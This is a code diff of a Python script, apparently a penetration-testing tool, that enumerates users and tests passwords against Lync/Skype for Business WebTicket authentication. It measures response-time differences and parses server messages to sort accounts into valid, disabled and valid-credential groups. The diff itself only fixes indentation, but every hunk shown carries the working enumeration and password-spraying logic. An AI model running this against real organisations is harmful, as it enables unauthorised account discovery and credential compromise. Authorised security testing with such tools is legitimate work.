@@ -163,28 +163,30 @@ def timing_attack(host,userfilepath,password,domain, randomize):
             if randomize:
                 random.shuffle(user_list)
             for user in user_list:
-		try:
-                 response_time = send_xml(host.rstrip(), domain.rstrip(), user.rstrip(), password.rstrip())
-		 candidatevalue=float(float(response_time)/timeout)
-                 if candidatevalue <= float("0.4"):
-                     if isDisabled:
-                         status="VALID USER (ACCOUNT DISABLED): {0}, Password: {1}, Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
-                         print_error(status)
-                         f.write("[*] {0}\n".format(status))
-                     elif validCred:
-                         status="VALID CREDENTIALS (VALID USER): {0}, Password: {1}, Time: {2}".format(user.rstrip(), password.rstrip(),response_time)
-                         print_good(status)
-                         f.write("[!] {0}\n".format(status))
-                     else:
-                         status="VALID USER (INVALID PASSWORD): {0}, Password: {1}, Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
-                         print_good(status)
-                         f.write("[+] {}\n".format(status))
-                 else:
-                         status="INVALID USER: {0}, Password: {1}, Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
-                         print_error(status)
-                         f.write("[-] {0}\n".format(status))
-		except Exception:
-			pass
+                try:
+                    response_time = send_xml(host.rstrip(), domain.rstrip(), user.rstrip(), password.rstrip())
+                    candidatevalue=float(float(response_time)/timeout)
+                    if candidatevalue <= float("0.4"):
+                        if isDisabled:
+                            status="VALID USER (ACCOUNT DISABLED): {0}, Password: {1}, Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
+                            print_error(status)
+                            f.write("[*] {0}\n".format(status))
+                        elif validCred:
+                            status="VALID CREDENTIALS (VALID USER): {0}, Password: {1}, Time: {2}".format(user.rstrip(), password.rstrip(),response_time)
+                            print_good(status)
+                            f.write("[!] {0}\n".format(status))
+                        else:
+                            status="VALID USER (INVALID PASSWORD): {0}, Password: {1}, Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
+                            print_good(status)
+                            f.write("[+] {}\n".format(status))
+                    else:
+                            status="INVALID USER: {0}, Password: {1}, Time: {2}".format(user.rstrip(),password.rstrip(),response_time)
+                            print_error(status)
+                            f.write("[-] {0}\n".format(status))
+                except Exception as e:
+                            pass
+
+
 
         endtime=datetime.datetime.now()
         elapsed_time=endtime - currenttime
@@ -195,27 +197,27 @@ def timing_attack(host,userfilepath,password,domain, randomize):
 
 # Determine the baseline timeout for invalid username
 def baseline_timeout(host, domain):
-	print_status("Performing baseline tests ... this will take a while")
-        response_times = []
-        for loop in range(0, 3):
-                try:
-                        random_user = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
-                        response_time = send_xml(host, domain, random_user, "n0t_y0ur_p4ss")
-                        if response_time:
-                                print_status("Response time for test #{0} is {1}".format((loop+1),response_time))
-                                response_times.append(float(response_time))
-                        else:
-                                break
-                except Exception as error:
-                        raise Exception(error)
+    print_status("Performing baseline tests ... this will take a while")
+    response_times = []
+    for loop in range(0, 3):
+            try:
+                    random_user = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
+                    response_time = send_xml(host, domain, random_user, "n0t_y0ur_p4ss")
+                    if response_time:
+                            print_status("Response time for test #{0} is {1}".format((loop+1),response_time))
+                            response_times.append(float(response_time))
+                    else:
+                            break
+            except Exception as error:
+                    raise Exception(error)
 
-        # Get average timeout for invalid username
-        if len(response_times) > 0:
-                average_timeout = sum(response_times) / len(response_times)
-        else:
-                average_timeout = None
+    # Get average timeout for invalid username
+    if len(response_times) > 0:
+            average_timeout = sum(response_times) / len(response_times)
+    else:
+            average_timeout = None
 
-        return average_timeout
+    return average_timeout
 
 
 # Send Lync request
@@ -231,35 +233,35 @@ def send_xml(host, domain, user, passwd):
 
         headers = {'Content-Type': 'text/xml; charset=utf-8','User-Agent': 'UCCAPI/16.0.13328.20130 OC/16.0.13426.20234'}
         try:
-                #print xml_data
-                lync_url = "https://{0}/WebTicket/WebTicketService.svc/Auth".format(host)
-                webholder = requests.post(lync_url, headers=headers, data=xml_data, verify=False)
-                if 'No valid' in webholder.text:
-                    validCred = False
-                    isDisabled = False
-		elif 'account is disabled' in webholder.text:
-                    validCred = False
-                    isDisabled = True
-                    #print_disabled(domain_user.rstrip())
-                else:
-                    isDisabled = False
-                    # this will eventually be switchable with verbose or debug flag
-                    #print_status(webholder.text)
-                    validCred = True
-                response_time = str(webholder.elapsed.total_seconds())
-                status_code = webholder.status_code
-                #print "Received status code " + str(status_code)
-                if int(status_code) == 200:
-                        print_success(domain_user.rstrip(),passwd.rstrip())
-                elif int(status_code) == 404:
-                        print_error('GETTING 404s OVER HERE!')
-                        return None
-                elif int(status_code) == 403:
-                        print_error('RECEIVING 403 FORBIDDEN - WRONG SERVER OR IT IS MS-HOSTED')
-                        return None
-                elif int(status_code) == 401:
-                        print_error('RECEIVING 401 AUTH PROMPT, SOMETHING IS UP, TEST WebTicket URL MANUALLY')
-                        return None
+            #print xml_data
+            lync_url = "https://{0}/WebTicket/WebTicketService.svc/Auth".format(host)
+            webholder = requests.post(lync_url, headers=headers, data=xml_data, verify=False)
+            if 'No valid' in webholder.text:
+                validCred = False
+                isDisabled = False
+            elif 'account is disabled' in webholder.text:
+                validCred = False
+                isDisabled = True
+                #print_disabled(domain_user.rstrip())
+            else:
+                isDisabled = False
+                # this will eventually be switchable with verbose or debug flag
+                #print_status(webholder.text)
+                validCred = True
+            response_time = str(webholder.elapsed.total_seconds())
+            status_code = webholder.status_code
+            #print "Received status code " + str(status_code)
+            if int(status_code) == 200:
+                    print_success(domain_user.rstrip(),passwd.rstrip())
+            elif int(status_code) == 404:
+                    print_error('GETTING 404s OVER HERE!')
+                    return None
+            elif int(status_code) == 403:
+                    print_error('RECEIVING 403 FORBIDDEN - WRONG SERVER OR IT IS MS-HOSTED')
+                    return None
+            elif int(status_code) == 401:
+                    print_error('RECEIVING 401 AUTH PROMPT, SOMETHING IS UP, TEST WebTicket URL MANUALLY')
+                    return None
         except Exception as error:
                 return None
 
